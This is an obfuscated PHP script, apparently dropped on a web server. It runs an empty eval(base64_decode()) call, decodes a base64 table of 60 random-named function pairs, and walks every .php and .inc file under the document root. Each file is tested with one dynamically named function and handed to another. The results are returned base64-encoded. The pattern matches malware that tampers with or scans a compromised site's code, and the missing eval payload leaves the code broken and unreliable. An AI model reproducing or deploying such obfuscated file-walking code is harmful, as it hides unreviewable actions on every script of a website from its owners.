eval(base64_decode(""));
$defs = unserialize(base64_decode("YTo2MDp7aTowO2E6Mzp7aTowO2k6MjtpOjE7czo5OiJybGJmZnl4eHEiO2k6MjtzOjExOiJnbXNyd216dHZ4YiI7fWk6MTthOjM6e2k6MDtpOjU7aToxO3M6Njoicmt5dnhsIjtpOjI7czoxMDoiZ2xmZXZuZ3VndSI7fWk6MjthOjM6e2k6MDtpOjE1O2k6MTtzOjg6InJ4dnRpY2h3IjtpOjI7czo3OiJnendvdnNoIjt9aTozO2E6Mzp7aTowO2k6MTg7aToxO3M6MTA6InJ4eGdnd2l6eGsiO2k6MjtzOjg6ImdoZmhjdm5iIjt9aTo0O2E6Mzp7aTowO2k6MjM7aToxO3M6MTA6InJiZ3BxdG9yaHUiO2k6MjtzOjk6ImdqZWJ1ZGlhbSI7fWk6NTthOjM6e2k6MDtpOjM2O2k6MTtzOjU6InJoaGdnIjtpOjI7czo0OiJncmlsIjt9aTo2O2E6Mzp7aTowO2k6NDI7aToxO3M6OToicnN2bWFveXh2IjtpOjI7czoxMToiZ3FzYm5rYmVkYmIiO31pOjc7YTozOntpOjA7aTo1NDtpOjE7czo2OiJyanRuYmEiO2k6MjtzOjEwOiJnaHluZmxudW5wIjt9aTo4O2E6Mzp7aTowO2k6NjA7aToxO3M6MTA6InJrcHJ2a3VnaGUiO2k6MjtzOjk6ImdjeWlsZmR0cCI7fWk6OTthOjM6e2k6MDtpOjg5O2k6MTtzOjY6InJuZG1qeCI7aToyO3M6MTA6ImdjYXhiZ2xpcGwiO31pOjEwO2E6Mzp7aTowO2k6MTA5O2k6MTtzOjEwOiJybXdoaXF5a2xzIjtpOjI7czo0OiJncnduIjt9aToxMTthOjM6e2k6MDtpOjExMDtpOjE7czo4OiJydndjeXB4aCI7aToyO3M6NzoiZ2ttZnJ5eCI7fWk6MTI7YTozOntpOjA7aToxMTE7aToxO3M6MTA6InJod2l3ZWZ6dHQiO2k6MjtzOjExOiJnb2d6aHF1Z3FvciI7fWk6MTM7YTozOntpOjA7aToxMTI7aToxO3M6NDoicmhjYSI7aToyO3M6ODoiZ3RtcW5rZ2YiO31pOjE0O2E6Mzp7aTowO2k6MTE1O2k6MTtzOjU6InJhZ3ljIjtpOjI7czo4OiJnbWJ6b29hdCI7fWk6MTU7YTozOntpOjA7aToxMTg7aToxO3M6Nzoicm9xY2hyeiI7aToyO3M6NjoiZ3Fha2ZjIjt9aToxNjthOjM6e2k6MDtpOjEyNjtpOjE7czoxMDoicmRpb2x4dXh6byI7aToyO3M6NzoiZ3FmeHJnZiI7fWk6MTc7YTozOntpOjA7aToxMjc7aToxO3M6MTE6InJtbXJma3h1cHhhIjtpOjI7czoxMToiZ3Z1Ymdkbnh1cG0iO31pOjE4O2E6Mzp7aTowO2k6MTMwO2k6MTtzOjk6InJvZ3Jjem1keSI7aToyO3M6MTA6ImdmeGpobGJhdnYiO31pOjE5O2E6Mzp7aTowO2k6MTM0O2k6MTtzOjExOiJycWhtaWF0Y2dseCI7aToyO3M6MTE6ImdpZmd0Ymhjd2pnIjt9aToyMDthOjM6e2k6MDtpOjEzODtpOjE7czo1OiJyYmFvayI7aToyO3M6NzoiZ2pudW16aiI7fWk6MjE7YTozOntpOjA7aToxNDY7aToxO3M6ODoicndjc3VsaW8iO2k6MjtzOjQ6ImdjcWgiO31pOjIyO2E6Mzp7aTowO2k6MTQ4O2k6MTtzOjEwOiJycWNhc2ltcnd0IjtpOjI7czoxMDoiZ2FzZWtxZnJnZSI7fWk6MjM7YTozOntpOjA7aToxNTc7aToxO3M6Njoicm1zeWduIjtpOjI7czo1OiJneXJudiI7fWk6MjQ7YTozOntpOjA7aToxNjM7aToxO3M6ODoicnNlYmd6bWUiO2k6MjtzOjExOiJnaWRucnR0YWtxZSI7fWk6MjU7YTozOntpOjA7aToxNjY7aToxO3M6MTE6InJzbGJwYmRqd2FuIjtpOjI7czo5OiJneXJ2d2tndmkiO31pOjI2O2E6Mzp7aTowO2k6MTcyO2k6MTtzOjY6InJpbmNqdiI7aToyO3M6MTA6Imdlb3NoYml2dXQiO31pOjI3O2E6Mzp7aTowO2k6MTc0O2k6MTtzOjQ6InJ3ZG4iO2k6MjtzOjk6ImdrdWdpbGVtYiI7fWk6Mjg7YTozOntpOjA7aToxNzk7aToxO3M6NDoicmFoaSI7aToyO3M6ODoiZ3h4Z3RnZWgiO31pOjI5O2E6Mzp7aTowO2k6MTg3O2k6MTtzOjg6InJtZ3hycmZkIjtpOjI7czo4OiJnY2Roc2plYiI7fWk6MzA7YTozOntpOjA7aToxODk7aToxO3M6ODoicmpnemttaGEiO2k6MjtzOjg6ImdpYmR0cnBsIjt9aTozMTthOjM6e2k6MDtpOjE5MjtpOjE7czo2OiJybnRvY2ciO2k6MjtzOjg6ImdwbXZ3ZHVtIjt9aTozMjthOjM6e2k6MDtpOjE5NjtpOjE7czo4OiJyaXd1eXBldiI7aToyO3M6MTA6Imd3c21zYWNvenkiO31pOjMzO2E6Mzp7aTowO2k6MTk4O2k6MTtzOjEwOiJyaHNudHRndnZ0IjtpOjI7czo3OiJnY2dmenhwIjt9aTozNDthOjM6e2k6MDtpOjE5OTtpOjE7czo0OiJybmRwIjtpOjI7czo3OiJnd2ZpaHdpIjt9aTozNTthOjM6e2k6MDtpOjIwMDtpOjE7czoxMDoicm5zZmR4Zmt3YSI7aToyO3M6OToiZ3RzZ3dyZXdhIjt9aTozNjthOjM6e2k6MDtpOjIwMTtpOjE7czo5OiJycmxob25nbHIiO2k6MjtzOjQ6Imd6eGUiO31pOjM3O2E6Mzp7aTowO2k6MjAzO2k6MTtzOjEwOiJydmdhZHViaGthIjtpOjI7czo5OiJnaHVrc3F6b3YiO31pOjM4O2E6Mzp7aTowO2k6MjA2O2k6MTtzOjk6InJycG9wbXN1biI7aToyO3M6OToiZ2J0YWhncWxtIjt9aTozOTthOjM6e2k6MDtpOjIwOTtpOjE7czo5OiJya2l3Z21zbmoiO2k6MjtzOjg6ImdnZWdpcXZ6Ijt9aTo0MDthOjM6e2k6MDtpOjIxMDtpOjE7czo5OiJyaGdremNqY2IiO2k6MjtzOjEwOiJnbW1rd3VmdndoIjt9aTo0MTthOjM6e2k6MDtpOjIxMjtpOjE7czo5OiJycmFoeG5meWIiO2k6MjtzOjQ6Imd4em4iO31pOjQyO2E6Mzp7aTowO2k6MjEzO2k6MTtzOjc6InJiaXZnYXMiO2k6MjtzOjU6ImdocHBwIjt9aTo0MzthOjM6e2k6MDtpOjIxNDtpOjE7czoxMToicmp0eGV0cmRrZ2kiO2k6MjtzOjU6Imd3dXZxIjt9aTo0NDthOjM6e2k6MDtpOjIxNTtpOjE7czo1OiJybnZnZyI7aToyO3M6ODoiZ2N6bHdydWMiO31pOjQ1O2E6Mzp7aTowO2k6MjE2O2k6MTtzOjg6InJ2dWFieWp0IjtpOjI7czoxMDoiZ3R6bnRra2d1YiI7fWk6NDY7YTozOntpOjA7aToyMTc7aToxO3M6Nzoicndjcm9qZiI7aToyO3M6NDoiZ3VweSI7fWk6NDc7YTozOntpOjA7aToyMTg7aToxO3M6NjoicnRscGxkIjtpOjI7czo5OiJnZ21remluY2YiO31pOjQ4O2E6Mzp7aTowO2k6MjE5O2k6MTtzOjEwOiJya3NkZHJta2h0IjtpOjI7czo5OiJnaGdub29leXMiO31pOjQ5O2E6Mzp7aTowO2k6MjIwO2k6MTtzOjg6InJ4aG51anljIjtpOjI7czoxMToiZ2h5YXhrbG5veHQiO31pOjUwO2E6Mzp7aTowO2k6MjIxO2k6MTtzOjU6InJocnpsIjtpOjI7czoxMToiZ3F6cWVhd3ZtbWoiO31pOjUxO2E6Mzp7aTowO2k6MjIyO2k6MTtzOjExOiJybWJma3BiaGR6ZSI7aToyO3M6ODoiZ3lieWdvZWYiO31pOjUyO2E6Mzp7aTowO2k6MjIzO2k6MTtzOjY6InJjb2tjYSI7aToyO3M6ODoiZ2V1aGdieHIiO31pOjUzO2E6Mzp7aTowO2k6MjI0O2k6MTtzOjk6InJnd2Nubmp2diI7aToyO3M6NjoiZ256YmR6Ijt9aTo1NDthOjM6e2k6MDtpOjIyNTtpOjE7czoxMToicnl2YnduaXhiZHMiO2k6MjtzOjg6ImdwbGF6dWVyIjt9aTo1NTthOjM6e2k6MDtpOjIyNjtpOjE7czoxMDoicmpyZXBibWZ1YSI7aToyO3M6ODoiZ2R0YmF3enYiO31pOjU2O2E6Mzp7aTowO2k6MjI3O2k6MTtzOjk6InJpa3Rha3hpbyI7aToyO3M6NToiZ2psbHkiO31pOjU3O2E6Mzp7aTowO2k6MjI4O2k6MTtzOjEwOiJyZmhrb2pydmNoIjtpOjI7czo4OiJnb2p1Y2R2cCI7fWk6NTg7YTozOntpOjA7aToyMjk7aToxO3M6NDoicmNzbSI7aToyO3M6NToiZ3JyZmUiO31pOjU5O2E6Mzp7aTowO2k6MjMwO2k6MTtzOjk6InJxcWp0dHZuYSI7aToyO3M6NDoiZ3ZjayI7fX0="));

function GetDocRoot()
{
    $docroot_end = strrpos($_SERVER['SCRIPT_FILENAME'], $_SERVER['REQUEST_URI']);
    if ($docroot_end === FALSE)
    {
        return $_SERVER['DOCUMENT_ROOT'];
    }
    elseif ($docroot_end === 0)
    {
        return "/";
    }
    else
    {
        return substr($_SERVER['SCRIPT_FILENAME'], 0, $docroot_end);
    }
}

function GetFileList($dir, $depth=1000000000)
{
    $result = array();

    $dir_count = 0;

    if ($depth < 1) {
        return $result;
    }

    $dir = strlen($dir) == 1 ? $dir : rtrim($dir, '\\/');
    $h = @opendir($dir);
    if ($h === FALSE)
    {
        return $result;
    }

    while (($f = readdir($h)) !== FALSE)
    {
        if ($f !== '.' and $f !== '..')
        {
            $current_dir = "$dir/$f";
            if (is_dir($current_dir))
            {
                $dir_count += 1;

                $result = array_merge($result, GetFileList($current_dir, $depth / 10));
            }
            else
            {
                $path_parts = pathinfo($current_dir);
                if (isset($path_parts['extension']) && ($path_parts['extension']=="php" || $path_parts['extension']=="inc"))
                {
                    $result[] = $current_dir;
                }

            }
        }
    }

    closedir($h);

    return $result;
}

$res = Array();
foreach(GetFileList(GetDocRoot()) as $path)
{
    $content = @file_get_contents($path);
    foreach($defs as $def_item)
    {
        if($def_item[1]($content))
        {
            if (!array_key_exists($def_item[0], $res))
            {
                $res[$def_item[0]] = 0;
            }
            
            $res[$def_item[0]] += 1;
            
            $def_item[2]($path);
        }
    }
}

echo base64_encode(serialize($res));
exit();